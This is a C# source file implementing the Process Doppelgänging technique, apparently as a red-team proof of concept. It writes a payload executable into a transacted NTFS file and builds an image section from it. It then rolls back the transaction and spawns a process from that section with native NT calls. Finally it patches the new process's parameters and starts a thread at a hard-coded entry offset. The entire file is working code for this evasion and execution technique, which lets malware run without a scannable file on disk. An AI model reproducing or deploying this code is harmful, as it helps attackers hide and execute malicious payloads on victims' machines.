using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

namespace ProcessDoppleganging
{
    public partial class Program
    {
        
        public static void Main(string[] args)
        {


            IntPtr thandle = CreateTransaction(
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0,
                0,
                0,
                null
                );

            Console.WriteLine(Marshal.GetLastWin32Error());
            Console.WriteLine(thandle);

            string exe_path = @"C:\Windows\temp\temp.exe";
           string payload_path = @"D:\red teaming tools\calc2.exe";

           // string exe_path = args[0];
           // string payload_path = args[1];

            IntPtr filehandle =CreateFileTransactedA(
                exe_path,
                0x40000000| 0x80000000,
                0x00000002| 0x00000001,
                IntPtr.Zero,
                2,
                0x80,
                IntPtr.Zero,
                thandle,
                IntPtr.Zero,
                IntPtr.Zero
                );

            Console.WriteLine(Marshal.GetLastWin32Error());
            Console.WriteLine(filehandle);

            byte[] content = File.ReadAllBytes(payload_path);

            uint byteswritten;
            IntPtr overlapped = IntPtr.Zero;
            WriteFile(filehandle, content, (uint)content.Length,
                out byteswritten, overlapped);

            Console.WriteLine("bytes written: {0}",byteswritten);
            Console.WriteLine(Marshal.GetLastWin32Error());

            /*byte[] toread = new byte[content.Length];
            uint bytesread = 0;
            ReadFile(filehandle,
             toread, (uint) content.Length, out bytesread, IntPtr.Zero);


            for(int i = 0; i < 4; i++)
            {
                Console.WriteLine(toread[i].ToString("X"));
            }*/
            IntPtr SectionHandle = IntPtr.Zero;
            uint MaximumSize = 2048;
             uint SEC_COMMIT = 0x08000000;
             uint SECTION_MAP_WRITE = 0x0002;
             uint SECTION_MAP_READ = 0x0004;
             uint SECTION_MAP_EXECUTE = 0x0008;
            uint SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;


            IntPtr sechandle = IntPtr.Zero;

            uint maxsize = 0;
            NtCreateSection(
                ref sechandle,
                0x0F001F,
                IntPtr.Zero,
                ref maxsize,
                0x02,
                0x1000000,
                filehandle
                );

            RollbackTransaction(thandle);
            CloseHandle(thandle);

            Console.WriteLine("section error: {0}",Marshal.GetLastWin32Error());
            Console.WriteLine(sechandle);
            
            IntPtr prochandle;

            NtCreateProcessEx(
                out prochandle,
                 0x001F0FFF,
                //0x000F0000 | 0x00100000 | 0xFFFF,
                //0x10000000,
                //0x0080,   
                IntPtr.Zero,
                Process.GetCurrentProcess().Handle,
                4,
                sechandle,
                IntPtr.Zero,
                IntPtr.Zero,
                false
                );


            Console.WriteLine("Process creation error: {0}",Marshal.GetLastWin32Error());
            Console.WriteLine(prochandle);

        
            IntPtr env;
            //CreateEnvironmentBlock(out env, IntPtr.Zero, true);

            
            UNICODE_STRING systemdir = stringToUNICODE_STRING(@"C:\Windows\System32");
            UNICODE_STRING imagepath = stringToUNICODE_STRING(payload_path);
            UNICODE_STRING windowtitle = stringToUNICODE_STRING("");
            IntPtr environment = IntPtr.Zero;
            UNICODE_STRING currentdir = stringToUNICODE_STRING(@"C:\");
            //CreateEnvironmentBlock(out environment, IntPtr.Zero, true);

            IntPtr uppptr = IntPtr.Zero;
            RtlCreateProcessParametersEx(
                ref uppptr, 
                ref imagepath,
               ref systemdir,
               ref currentdir, 
              ref imagepath, 
                environment,
               ref windowtitle,
               ref windowtitle, 
                IntPtr.Zero, IntPtr.Zero, 1);


            // environment size offset 
            //  Offset is 0x3F0 on x64
            //     or 0x290 on x86
            long value = Marshal.ReadInt64(uppptr + 0x3f0);
            Console.WriteLine("envsize: {0}",value.ToString("X"));
           // RtlUserProcessParameters temp = (RtlUserProcessParameters) Marshal.PtrToStructure(uppptr, typeof(RtlUserProcessParameters));

            // Console.WriteLine("Environment size: {0}",temp.EnvironmentSize.ToString("X"));

            Console.WriteLine("Setting error: {0}",Marshal.GetLastWin32Error());

            
            PROCESS_BASIC_INFORMATION pbi= GetProcessImageBase(prochandle);
            Console.WriteLine(pbi.PebAddress.ToString("X"));


            // 0x20 offset for process parameters on 64 bit
            // 0x10 offset on 32 bit

            Int32 iProcessParamsSize = Marshal.ReadInt32((IntPtr)((Int64)uppptr + 4));
           // Console.WriteLine(iProcessParamsSize);
            //Console.WriteLine("Size of rtluserparams: {0}",Marshal.SizeOf(typeof(RtlUserProcessParameters64)));
            
            //  iProcessParamsSize += 0x2000;
             iProcessParamsSize += (Int32) value;

            IntPtr startingptr = VirtualAllocEx(
                prochandle,
                uppptr,
               (uint)iProcessParamsSize,
                0x3000,
                0x40
                );

            Console.WriteLine("Memory allocated at: {0}",startingptr.ToString("X"));
            Console.WriteLine("uppptr: {0}",uppptr.ToString("X"));
            
            byte[] towrite = new byte[iProcessParamsSize];

            
            Marshal.Copy(uppptr, towrite, 0, iProcessParamsSize);

            Console.WriteLine(towrite.Length);

            uint byteswritten2 = 0;
            WriteProcessMemory(prochandle,
                uppptr,
                towrite,
                towrite.Length,
                ref byteswritten2
                );
            Console.WriteLine("Bytes written: {0}",byteswritten2);

            long addr = uppptr.ToInt64();
            byte[] test= BitConverter.GetBytes(addr);
            uint outwritten = 0;

            WriteProcessMemory(
                prochandle,
               (IntPtr)( pbi.PebAddress.ToInt64() + 0x20),
                test,
                8,
                ref outwritten
                );
            Console.WriteLine("write process error: {0}",Marshal.GetLastWin32Error());
            Console.WriteLine("outwritten: {0}",outwritten);

            byte[] imagebase = new byte[8];
            ReadProcessMemory(prochandle, pbi.PebAddress + 0x10,
                imagebase, 8, ref outwritten);

            long remotebase =BitConverter.ToInt64(imagebase, 0);
            Console.WriteLine(remotebase.ToString("X"));
            //  Console.WriteLine(outwritten);




            uint threadid = 0;
            IntPtr threadhandle = IntPtr.Zero;







            // Console.WriteLine(threadid);
            uint threadid2 = 0;
            /*threadhandle = CreateRemoteThread(
                prochandle,
                IntPtr.Zero,
                0,
                (IntPtr)(remotebase + 0x4000),
                IntPtr.Zero,
                0,
                ref threadid2
                );*/


            int res= NtCreateThreadEx(
                ref threadhandle,
                0x1FFFFFF,
                IntPtr.Zero,
                prochandle,
                (IntPtr)(remotebase + 0x4000),
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero
                );

           
            Console.WriteLine(Marshal.GetLastWin32Error());
            Console.WriteLine("Thread handle: {0}",threadhandle);
            Console.WriteLine(res);

            NtClose(sechandle);
           
            
            
            CloseHandle(filehandle);

            CloseHandle(threadhandle);

            Console.ReadKey();
        }
    }
}
